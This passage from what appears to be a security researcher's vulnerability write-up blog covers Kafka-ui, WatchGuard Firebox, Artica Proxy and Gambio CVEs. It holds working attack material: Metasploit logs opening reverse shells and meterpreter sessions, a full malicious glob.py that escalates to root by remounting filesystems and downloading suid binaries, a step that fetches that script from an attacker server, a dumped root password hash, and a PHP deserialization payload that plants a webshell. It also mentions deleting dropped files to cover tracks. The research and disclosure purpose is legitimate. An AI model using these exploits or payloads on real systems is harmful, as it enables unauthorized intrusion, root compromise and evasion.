      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1

  kafka-ui:
    container_name: kafka-ui
    image: provectuslabs/kafka-ui:v0.7.0
    networks:
      - rmoff_kafka
    ports:
      - 8080:8080
    depends_on:
      - kafka
      - zookeeper
    environment:
      KAFKA_CLUSTERS_0_NAME: local
      KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS: kafka:9092
      KAFKA_CLUSTERS_0_ZOOKEEPER: zookeeper:2181
      KAFKA_BROKERCONNECT: kafka:9092
      DYNAMIC_CONFIG_ENABLED: 'true'
      KAFKA_CLUSTERS_0_METRICS_PORT: 9997
``` 
* Run following command `docker-compose up -d` to install and run the Kafka ui and cluster environment.
* Your Kafka ui should be accessible on `http://localhost:8080` with an active Kafka cluster running.
* You can bring down the environment for a fresh start with the command `docker-compose down --volumes`.

You are now ready to test the vulnerability.

And as usual, I took the liberty to code a nice Metasploit module that does it all for you.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/kafka_ui_unauth_rce_cve_2023_52251.rb) in my local repository or as [PR 18700](https://github.com/rapid7/metasploit-framework/pull/18700) at Metasploit Github development.

### Mitigation
Kafka-ui versions between `v0.4.0` - `v0.7.1` are vulnerable and there is no fix. 
There is no outlook yet when it will be fixed, so do not use a default installation which has no authentication enabled.
It is strongly advised to configure Kafka-ui with basic authentication.

### References
[CVE-2023-52251](https://nvd.nist.gov/vuln/detail/CVE-2023-52251)
[Kafka-ui unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/kafka_ui_unauth_rce_cve_2023_52251.rb)
[Kafka-ui unauthenticated RCE - Metasploit PR 18700](https://github.com/rapid7/metasploit-framework/pull/18700)
[POC](https://github.com/BobTheShoplifter/CVE-2023-52251-POC)
[Kafka-ui Github development](https://github.com/provectus/kafka-ui)

### Credits
* [BobTheShopLifter](https://github.com/BobTheShoplifter/)
* [ThingStad](https://github.com/ThingStad/)


---

## CVE-2022-26318
*Posted 2024-03-03 · last revised 2024-03-08*

> On WatchGuard Firebox and XTM appliances, an unauthenticated user can execute arbitrary code, aka FBX-22786. This vulnerability impacts Fireware OS before 12.7.2_U2, 12.x before 12.1.3_U8, and 12.2.x through 12.5.x before 12.5.9_U2.

Almost two years ago (28 march 2022) `jbaines` published some initial analysis on this vulnerability, still questioning what exactly the modus operandus is to exploit this vulnerability.  On the 29th of august 2022, `Charles Fol` from Ambionics Security published a [blog](https://www.ambionics.io/blog/hacking-watchguard-firewalls) where in much detail several vulnerabilities are explained including this one. A similar analysis was done by `Dylan Pindur`, security researcher from AssetNote which reverse engineered this CVE in more detail (find his [blog here](https://www.assetnote.io/resources/research/diving-deeper-into-watchguard-pre-auth-rce-cve-2022-26318)).

The most interesting part for me is the fact that the WatchGuard XTM appliance is pretty well protected and hardened. For instance, there is no unix shell installed on the virtual appliance and all filesystems are protected either with `read-only` or `no-exec`, `no-suid` options which make it pretty hard to get privileged access. The only shell access is a old python version (2.7.14) that is installed and available for exploitation.
I will not deep dive the buffer overflow (BOF) vulnerability here because it is pretty well explained in both blogs that I mentioned above.

I created a Metasploit module that you can find here as [PR 18915 ](https://github.com/rapid7/metasploit-framework/pull/18915) which will use the BOF to get a python interactive console. 
The real fun starts when you have python interactive console access and try to elevate your rights to get `root` on the box. You can do this by exploiting another vulnerability [CVE-2022-31791](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-31791).  
You can read this more detail in my technical analysis [here](https://attackerkb.com/topics/O8En8pVX7G/cve-2022-31791).

### Module in action
```shell
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > options

Module options (exploit/linux/http/watchguard_firebox_unauth_rce_cve_2022_26318):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       WatchGuard Firebox base url
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CreateSession  true             no        Create a new session for every successful login
   LHOST                           yes       The listen address (an interface may be specified)
   LPORT          4444             yes       The listen port
   SHELL          /usr/bin/python  yes       The system shell to use


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Reverse Python Interactive Shell)

View the full module info with the info, or info -d command.
```
```shell
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > set rhosts 192.168.201.24
rhosts => 192.168.201.24
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.24:8080 can be exploited.
[+] The target appears to be vulnerable.
[*] 192.168.201.24:8080 - Attempting to exploit...
[*] 192.168.201.24:8080 - Sending payload...
[*] Command shell session 9 opened (192.168.201.8:4444 -> 192.168.201.24:40354) at 2024-03-03 19:50:17 +0000


Shell Banner:
Python 2.7.14 (default, Oct 16 2019, 15:38:29)
[GCC 6.5.0] on linux2
-----

>>> import os
>>> import subprocess
>>> os.listdir("./")
['debug', 'platform', 'log', 'wgapi', 'hosts', 'mdev.seq', 'admd.rsync', 'portald', 'portald_data', 'eth0mac', 'rs_sn', '.libtdts_ctrl.lck', 'fw', 'mwan.input', 'wgmsg', 'nwd_dfltmac', 'fqdn_dns_server_list', 'lm.conf', 'sw.conf', 'wcfqdn_label', 'ifmd.cfg.lock', 'wgif_dhcp_eth0.pid', 'wgif_dhcp_eth0_uds', 'wgif_eth1.cfg.lock', 'wgif_eth1.cfg', 'rootca', 'haopevent.log', 'keeper_init_uds', 'sslvpn', 'empty', 'certs.rsync', 'certs.unpack', 'csync', 'ldapsCA', 'iked.semid', 'system_hash.txt', 'iked.params', 'iked.pid', 'cdiag', 'lockout_users.xml', 'dxcpd', 'wgredir.txt', 'dimension', 'affinityd.err', 'wgif_eth0.cfg.lock', 'wgif_eth0.cfg', 'dhcp6d.conf', '6OGD.py', 'ifmd.cfg', 'dhcpd.conf', 'dnsmasq-internal.conf', 'radvd.conf', 'yDnm.py', 'HPM4.py']
>>>
>>> os.getuid()
99
>>> os.getgid()
96
>>> print(open("/etc/passwd").read())
root:!$6$XlAENt8.$3RgXuDXBhgsf0FqJ0hrzmrh6qAhvMlCkU6Z976KIDI27gxIZOI0f27lkyJwubRxW5VaO4i9olIybS0Z2R9Ihw1:0:0:Administrator:/root:/bin/ash
bin:x:1:1:bin:/bin:
system:x:2:96:WG System daemons:/:
nobody:x:99:99:Nobody:/:
wgntp:x:98:98:OpenNTP daemon:/var/run/ntpd:
openvpn:x:97:97:OpenVPN daemon:/:
www:x:96:95:WebUI:/:
cli:x:95:95:CLI:/:
cfm:x:94:94:CFM:/var/cfm_sandbox:
agent:x:93:96:WG Agent:/:
scand:x:91:94:Scanning Daemon:/var/run/scand:
spamd:x:90:94:Spam Daemon:/var/cfm_sandbox:
sshd:x:89:89:sshd privilege separation:/var/empty:
quagga:x:88:88:Quagga Dynamic Routing:/var/run/quagga:
wgcha:x:92:96:WG Call Home Agent:/var/run/wgcha:
netdbg:x:87:87:Diagnostic Utilities:/tmp/netdbg:
cwagent:x:100:100:ConnectWise Agent:/var/empty:
dimension:x:101:101:Dimension Service:/var/run/dimension:
tss:x:102:102:trousers daemon:/:
atagent:x:103:103:Autotask Agent:/var/empty:
psad:x:104:104:PSA Daemon:/var/empty:
guac:x:105:105:Guacamole Daemons:/var/run/guac:
portald:x:106:105:Portald:/var/run/portald:
admin:x:109:109:Admin Cli Access:/etc/wg/admin-home:/usr/bin/cli
wgadmin:x:109:109:Admin Cli Access:/etc/wg/admin-home:/usr/bin/cli
dnswatchd:x:110:96:DNSWatch Service Daemon:/var/empty:
tpagent:x:111:96:Tigerpaw Agent:/var/empty:

>>> print(open("/etc/group").read())
admin:x:0:0
bin:x:1:admin,bin
nobody:x:99:
wgntp:x:98:
openvpn:x:97:
wg:x:96:
ui:x:95:
proxy:x:94:
sshd:x:89:
quagga:x:88:
netdbg:x:87:
cwagent:x:100:
dimension:x:101:
tss:x:102:
atagent:x:103:
psad:x:104:
ctlvpn:x:105:
dnswatchd:x:107:

>>> os.uname()
('Linux', 'FireboxV', '4.14.83', '#1 SMP Mon Sep 27 17:48:07 PDT 2021', 'x86_64')
>>>
```
### References
[CVE-2022-26318](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-26318)
[Blind exploits to rule WatchGuard firewalls by Charles Fol](https://www.ambionics.io/blog/hacking-watchguard-firewalls)
[Diving Deeper into WatchGuard Pre-Auth RCE - CVE-2022-26318](https://www.assetnote.io/resources/research/diving-deeper-into-watchguard-pre-auth-rce-cve-2022-26318)
[Metasploit module PR 18915 ](https://github.com/rapid7/metasploit-framework/pull/18915)
[WatchGuard XTM Firebox v12.7.2 download](https://cdn.watchguard.com/SoftwareCenter/Files/XTM/12_7_2/FireboxV_12_7_2.ova)

### Credits
Credits goes to `Charles Fol` of Ambionics Security  who discovered  this vulnerability.
The reverse engineering of this CVE was performed by `Dylan Pindur` from AssetNote.


---

## CVE-2022-31791
*Posted 2024-03-07 · last revised 2024-03-21*

> WatchGuard Firebox and XTM appliances allow a local attacker (that has already obtained shell access) to elevate their privileges and execute code with root permissions. This is fixed in Fireware OS 12.8.1, 12.5.10, and 12.1.4.

This journey starts when you have gained initial access to the WatchGuard FireBox firewall instance as described in this [attackerkb article](https://attackerkb.com/topics/t8Nrnu99ZE/cve-2022-26318).
The initial access is non privileged as user `nobody` and `/etc/fstab` shows that all filesystems are either protected with `read-only`, `no-suid` or `no-exec`.  Another interesting aspect is that there is no shell installed at all and the available unix binaries are very limited as well as `busybox` which only provides a very limited command set.  This makes `living off the land` pretty useless except for the `nmap` binary which is installed by default. 
```shell
Shell Banner:
Python 2.7.14 (default, Oct 16 2019, 15:38:29)
[GCC 6.5.0] on linux2
-----

>>> import os
>>> os.getuid()
99
>>> os.getgid()
96
>>> import subprocess
>>> print(open("/etc/fstab").read())
/dev/wgrd.sysa_code    /           ext2        ro,noatime              1 1
/dev/wgrd.sysa_data    /etc/wg     ext3        rw,noexec,noatime       0 0
none                   /proc       proc        defaults                0 0
none                   /sys        sysfs       defaults                0 0
/dev/wgrd.boot         /boot       ext2        ro,noexec,noatime       0 0
/dev/wgrd.pending      /pending    ext2        rw,noexec,noatime       0 0
/dev/wgrd.var          /var        ext2        rw,noexec,noatime       0 0

# wg_linux platform.pkgspec

>>> subprocess.call(["nmap", "127.0.0.1"])
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-08 19:55 CET
Nmap scan report for localhost.localdomain (127.0.0.1)
Host is up (0.0014s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4125/tcp open  rww
4126/tcp open  ddrepl
5000/tcp open  upnp
5001/tcp open  commplex-link
5002/tcp open  rfe
5003/tcp open  filemaker
5004/tcp open  avt-profile-1
6001/tcp open  X11:1
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
0
>>>
```
So the big question, how do we get privileged access?
Luckily, the appliance has `python` installed and this heavily used by a lot of specific binaries for WatchGuard. One of those binaries is the `/usr/bin/fault_rep` program, that generates  a crash report whenever a program crashes. And it has  the `setuid` bit set on user root.
```shell
>>> subprocess.call(["ls", "-l", "/usr/bin/fault_rep"])
-rwsr-xr-x    1 root     admin        31424 Sep 28  2021 /usr/bin/fault_rep
0
>>>
```
Having a closer look at the binary, it internally calls `/usr/bin/diag_snapgen`, a python program. Here are lines of the program:
```shell
>>> print(open("/usr/bin/diag_snapgen").read())
#!/usr/bin/python

#
# Diagnostic Snapshot Generator
#
# This script runs when a fault triggers through the Fault Reporting System.
#

import subprocess
import glob

#
# These files will have their contents copied into the diagnostic snapshot
# file.  Add (or subtract!) from this list at will.
#
FILES = [
    '/etc/wg/bootlog',
    '/var/log/*.log',
    '/var/log/trace/*.log',
    '/proc/interrupts',
    '/proc/meminfo'
]

#
# These programs will have their output copied into the diagnostic snapshot
# file.  Add (or subtract!) from this list at will.
#
PROGRAMS = [
    '/bin/ps',
    '/bin/ls -l /tmp',
    '/bin/df',
    '/bin/dmesg'
]

#
# Diagnostic Snapshot Generation
#

for i, path in enumerate(FILES):
    for j, name in enumerate(glob.glob(path)):
        print "=== %s ===" % (name)
        try:
            f = open(name)
            for line in f:
                print line,

            f.close()
        except:
            print "(Unable to open file!)"
        print

for i, name in enumerate(PROGRAMS):
    print "=== %s ===" % (name)
    try:
        name = name.split()
        p = subprocess.Popen(name, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        if p.returncode:
            raise(Exception(err))
        print out
    except:
        print "(Unable to run command!)"
    print

>>>
```
This is pretty promising because `glob.py`, which is imported, can be easily exchanged by a malicious program with the same name. This will run under root context.

So let's think this thru...
* We create a malicious `glob.py` where we can run python code under the context of root.
* This python code should remount a filesystem with `exec` and `read-write` rights.
* A good candidate is the `/dev/wgrd.pending` filesystem.
* We can download a static linked `bash` and `busybox` x86-64 binary from the web.
* Change the ownership to `root.admin` and set the `suid` and `sgid` bit on both binaries.
* We should now be able to spin off a root shell that gives us full control on the appliance.

This sounds like a plan...
Here is malicious `glob.py` code.
```python
import subprocess, os, requests, ctypes
# set root
os.setuid(0)
os.setgid(0)

# remount /pending directory to enable suid and execution
def mount(source, target, fs, options='', flags=0):
  ret = ctypes.CDLL('libc.so.6', use_errno=True).mount(source, target, fs, flags, options)
  if ret < 0:
    errno = ctypes.get_errno()
    raise RuntimeError("Error mounting {} ({}) on {} with options '{}': {}".format(source, fs, target, options, os.strerror(errno)))

# 32 -- MS_REMOUNT flag
mount('/dev/wgrd.pending', '/pending', 'ext2', 0, 32)

# get the bash static x86_64 binary
response = requests.get("https://github.com/ryanwoodsmall/static-binaries/raw/master/x86_64/bash", verify=False)
with open("/pending/tmp/bash", mode="wb") as file:
	file.write(response.content)

# get busybox static x86_64 binary
response = requests.get("https://github.com/ryanwoodsmall/static-binaries/raw/master/x86_64/busybox", verify=False)
with open("/pending/tmp/busybox", mode="wb") as file:
	file.write(response.content)

# setuid and sgid bit and make world executable. Bingo, you are root now!
os.chown("/pending/tmp/bash", 0, 0)
os.chmod("/pending/tmp/bash", 0o6755)
os.chown("/pending/tmp/busybox", 0, 0)
os.chmod("/pending/tmp/busybox", 0o6755)
exit()
```
Ok, let's test this...
We will first upload our malicious `glob.py` to `/tmp` which is by default read-write, however we can not run any binaries in `/tmp` except for python scripts. But that is anyhow all we need...
To ensure that our malicious `glob.py` gets imported, we need to change the `PYTHONPATH` to `/tmp` or `. `.
We than call our root `suid` program `/usr/bin/fault_rep` and our malicious `glob.py` should do the magic.
```shell
>>> import requests
>>> response = requests.get("http://192.168.201.8:1980/glob.py")
>>> with open("/tmp/glob.py", mode="w") as file:
... 	file.write(response.content)
...
>>> subprocess.call(["ls", "-l", "/tmp/glob.py"])
-rw-r--r--    1 nobody   wg            1364 Mar  8 17:03 /tmp/glob.py
0
>>>
```
Ok, we have successfully downloaded `glob.py`. Please ensure that you have a `http` server running on your attacker machine.
Next step is to set the `PYTHONPATH` and run `/usr/bin/fault_rep`.
```shell
>>> myenv = os.environ.copy()
>>> myenv['PYTHONPATH'] = '.'
>>> print(myenv)
{'PYTHONPATH': '.'}
>>> subprocess.check_call(["/usr/bin/fault_rep", "-r", "'a'", "-c1", "-v"], env=myenv)
generating fault [01/unspecified] (Failed Assertion)...
0
>>>
```
Let's check if the binaries are downloaded in `/pending/tmp` directory and owned by `root.admin` with `suid` and `sgid` bit set.
```shell
>>> subprocess.call(["ls", "-l", "/pending/tmp"])
-rwsr-sr-x    1 root     admin      2772944 Mar  8 17:14 bash
-rwsr-sr-x    1 root     admin      1894248 Mar  8 17:14 busybox
srw-r-----    1 nobody   nobody           0 Mar  7 22:38 cgi
-rw-r--r--    1 root     admin            0 Mar  8 16:37 configd.log
srw-rw-rw-    1 nobody   wg               0 Mar  7 22:38 epm
srw-rw-rw-    1 root     admin            0 Mar  7 22:38 geolocation
-rw-r--r--    1 nobody   wg            1364 Mar  8 17:00 glob.py
prw-------    1 nobody   wg               0 Mar  7 22:38 radiusd
prw-------    1 nobody   wg               0 Mar  7 22:38 rsso-auth
srwxr-xr-x    1 nobody   admin            0 Mar  7 22:38 webui
srw-rw-rw-    1 nobody   wg               0 Mar  8 16:00 wgagent
0
>>>
```
Cool, the trick worked!
Let's get our `bash` root shell...
```shell
>>> subprocess.call(["/pending/tmp/bash", "-i"])
bash: cannot set terminal process group (11397): Not a tty
bash: no job control in this shell
bash-5.2$ /pending/tmp/busybox id
/pending/tmp/busybox id
uid=99(nobody) gid=96(wg)
bash-5.2$
```
Mmm, that's strange. Looks that `suid` is not working.
Ahh, this rings a bell. Set `suid` bit on a `bash` shell does not work out of the box. There is `-p` option that overrides this behavior.
```shell
bash-5.2# >>> subprocess.call(["/pending/tmp/bash", "-i", "-p"])
bash: cannot set terminal process group (11397): Not a tty
bash: no job control in this shell
bash-5.2# /pending/tmp/busybox id
/pending/tmp/busybox id
uid=99(nobody) gid=96(wg)
```
We got a root prompt, but we are still not there with full root access.
Let's start a python session in this shell and set the `suid` and `sgid` once more and launch the `bash` shell again.
```shell
bash-5.2# python -i
python -i
Python 2.7.14 (default, Oct 16 2019, 15:38:29)
[GCC 6.5.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.setgid(0)
>>> import subprocess
>>> subprocess.call(["/pending/tmp/bash", "-i"])
bash: cannot set terminal process group (12299): Not a tty
bash: no job control in this shell
bash-5.2# /pending/tmp/busybox id
/pending/tmp/busybox id
uid=0(root) gid=0(admin)
bash-5.2#
```
Here we go!
We have full root access now.

### References
[CVE-2022-31791](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-31791)
[Blind exploits to rule WatchGuard firewalls by Charles Fol](https://www.ambionics.io/blog/hacking-watchguard-firewalls)
[Metasploit module PR 18915 ](https://github.com/rapid7/metasploit-framework/pull/18915)
[WatchGuard XTM Firebox v12.7.2 download](https://cdn.watchguard.com/SoftwareCenter/Files/XTM/12_7_2/FireboxV_12_7_2.ova)

### Credits
Credits goes to `Charles Fol` of Ambionics Security  who discovered  this vulnerability.



---

## CVE-2024-2054
*Posted 2024-03-15 · last revised 2024-11-15*

> The Artica-Proxy administrative web application will deserialize arbitrary PHP objects supplied by unauthenticated users and subsequently enable code execution as the "www-data" user.

One of the common vulnerabilities that is still around and pretty common nowadays is the Deserialization of Untrusted Data (`DUD`). 
`DUD` is a vulnerability that can occur in software systems that use serialization and deserialization. Serialization is the process of converting an object’s state to a stream of bytes, while deserialization is the process of recreating the object from the stream of bytes. 

This is typically used to exchange information between systems. Distributed systems often share objects across separate nodes, so objects must be delivered over the wire. Since objects tend to consist of many parts, it can be time-consuming to write code that handles the delivery of each individual part. Serialization enables us to save and transmit the state of an object in a standardized way. Deserialization then enables us to recreate objects after they have been serialized for transmission over the wire, between applications, through firewalls, and more.

In a system that uses `DUD`, untrusted data, such as data received from an external source, is deserialized without proper validation. This can allow an attacker to inject malicious data into the system, potentially leading to security vulnerabilities such as remote code execution, unauthorized access to sensitive data, or other malicious actions (see also [MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html) or [OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)).

And this vulnerability is one of the many that we see nowadays. Korelogic discovered a `DUD` in Artica Proxy `4.50` and `4.40` in `wiz.wizard.progress.php` where prior to authentication, a user can send an HTTP request to the `/wizard/wiz.wizard.progress.php` endpoint. This endpoint processes the `build-js` query parameter by base64 decoding the provided value without checking the data and then calling the `unserialize` PHP function with the decoded value as input. More technical details can be found in the [Korelogic Advisory KL-001-2024-002](https://korelogic.com/Resources/Advisories/KL-001-2024-002.txt).

I have created a Metasploit module that will exploit this vulnerability. I did make some enhancements compared to the POC that Korelogic published. For instance, I am not overwriting the file `/usr/share/artica-postfix/wizard/wiz.upload.php` but creating a randomized  PHP file to trigger the remote code execution which is removed automatically after successful exploitation to cover our tracks.

### Module Details
```msf
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > info

       Name: Artica Proxy Unauthenticated PHP Deserialization Vulnerability
     Module: exploit/linux/http/artica_proxy_unauth_rce_cve_2024_2054
   Platform: PHP, Unix, Linux
       Arch: php, cmd, x64, x86
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2024-03-05

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Jaggar Henry of KoreLogic Inc.

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   PHP
      1   Unix Command
      2   Linux Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                        sics/using-metasploit.html
  RPORT      9000             yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The Artica Proxy endpoint URL
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host
  WEBSHELL                    no        Set webshell name without extension. Name will be randomly generated if left un
                                        set.


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on t
                                      he local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT  1981             yes       The local port to listen on.


  When TARGET is not 0:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  COMMAND  passthru         yes       Use PHP command function (Accepted: passthru, shell_exec, system, exec)

Payload information:

Description:
  A Command Injection vulnerability in Artica Proxy appliance 4.50 and below allows
  remote attackers to run arbitrary commands via unauthenticated HTTP request.
  The Artica Proxy administrative web application will deserialize arbitrary PHP objects
  supplied by unauthenticated users and subsequently enable code execution as the "www-data" user.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2024-2054
  https://attackerkb.com/topics/q1JUcEJjXZ/cve-2024-2054
  https://packetstormsecurity.com/files/177482


View the full module info with the info -d command.
```
**Target 0 - PHP native `php/meterpreter/reverse_tcp` session**
```msf
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set webshell cuckoo
webshell => cuckoo
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set target 0
target => 0
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set rhosts 192.168.201.4
rhosts => 192.168.201.4
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.4:9000 can be exploited.
[+] The target is vulnerable. Artica version: 4.50
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (39927 bytes) to 192.168.201.4
[+] Deleted /usr/share/artica-postfix/wizard/cuckoo.php
[*] Meterpreter session 15 opened (192.168.201.8:4444 -> 192.168.201.4:33986) at 2024-03-15 17:46:04 +0000

meterpreter > sysinfo
Computer    : artica-applianc
OS          : Linux artica-applianc 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
meterpreter >
```

## Mitigation
If you want to test the module, you can download a vulnerable Artica Proxy appliance from [here](https://sourceforge.net/projects/artica-squid/files/ISO/). You are strongly advised to upgrade your appliance to the latest version, but at least to a version greater then `4.50`.  Another quick fix is to remove the `/usr/share/artica-postfix/wizard` directory if it is not needed.

## References
[CVE-2024-2054](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2054)
[Korelogic Advisory KL-001-2024-002](https://korelogic.com/Resources/Advisories/KL-001-2024-002.txt)
[MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
[OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
[Artica Proxy Appliance ISO Downloads](https://sourceforge.net/projects/artica-squid/files/ISO/)
[Metasploit PR 18967: Artica Proxy unauthenticated RCE] (https://github.com/rapid7/metasploit-framework/pull/18967)

### Credits
Credits goes to the security researcher below who discovered this vulnerability
* `Jaggar Henry of KoreLogic Inc.`


---

## CVE-2024-23759
*Posted 2024-03-24 · last revised 2024-03-30*

> Deserialization of Untrusted Data in Gambio through 4.9.2.0 allows attackers to run arbitrary code via "search" parameter of the Parcelshopfinder/AddAddressBookEntry" function.

As discussed in my previous attackerkb article [CVE-2024-2054](https://attackerkb.com/topics/q1JUcEJjXZ/cve-2024-2054) , here another example of a Deserialization of Untrusted Data (DUD) vulnerability. 
In this case, it is present at the online e-commerce webshop made by [Gambio](https://www.gambio.com/). If you launch their main website, it shows you that around 20.000 Webshops are live. I did a search with `Shodan` using `http.component:"Gambio"` and I could only find a limited amount of webshops, (around 300) but nevertheless the majority of these webshops are still vulnerable.

The main issue sits in the `search` parameter of the `Parcelshopfinder/AddAddressBookEntry` function which is de-serialized without checking the data.

The `ParcelshopfinderController.inc.php` file contains this vulnerable function (line 291).
```php
$postnumber = abs(filter_var($postnumber, FILTER_SANITIZE_NUMBER_INT));    
if ($postnumber == 0 || $this->isValidPostnummer($postnumber) !== true) {        
    $search    = unserialize(base64_decode($this->_getPostData('search')));
    $psfParams = [
            'street'          => $search[0],
            'house'           => $search[1],
            'zip'             => $search[2],
            'city'            => $search[3],
            'country'         => $search[4],
            'firstname'       => $firstname,
            'lastname'        => $lastname,
            'postnumber'      => $postnumber,
            'additional_info' => $additional_info,
            'error'           => 'invalid_postnumber',
    ];
}
```
The application is using "Guzzle" which can be used as a gadget chain to receive arbitrary code execution by writing arbitrary files.

The following data  triggers this vulnerability when encoded with `base64`
`"O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:36:\"\00GuzzleHttp\\Cookie\\CookieJar\00cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\00GuzzleHttp\\Cookie\\SetCookie\00data\";a:9:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:30:\"<?php echo system('whoami');?>\";s:4:\"Path\";s:1:\"/\";s:4:\"Name\";s:6:\"cuckoo\";s:6:\"Domain\";s:9:\"clock.com\";s:6:\"Secure\";b:0;s:8:\"Httponly\";b:0;s:7:\"Max-Age\";i:3;}}}s:39:\"\00GuzzleHttp\\Cookie\\CookieJar\00strictMode\";N;s:41:\"\00GuzzleHttp\\Cookie\\FileCookieJar\00filename\";s:10:\"cuckoo.php\";s:52:\"\00GuzzleHttp\\Cookie\\FileCookieJar\00storeSessionCookies\";b:1;}"`
```shell
echo -e "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:36:\"\00GuzzleHttp\\Cookie\\CookieJar\00cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\00GuzzleHttp\\Cookie\\SetCookie\00data\";a:9:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:30:\"<?php echo system('whoami');?>\";s:4:\"Path\";s:1:\"/\";s:4:\"Name\";s:6:\"cuckoo\";s:6:\"Domain\";s:9:\"clock.com\";s:6:\"Secure\";b:0;s:8:\"Httponly\";b:0;s:7:\"Max-Age\";i:3;}}}s:39:\"\00GuzzleHttp\\Cookie\\CookieJar\00strictMode\";N;s:41:\"\00GuzzleHttp\\Cookie\\FileCookieJar\00filename\";s:10:\"cuckoo.php\";s:52:\"\00GuzzleHttp\\Cookie\\FileCookieJar\00storeSessionCookies\";b:1;}" | base64 -w0
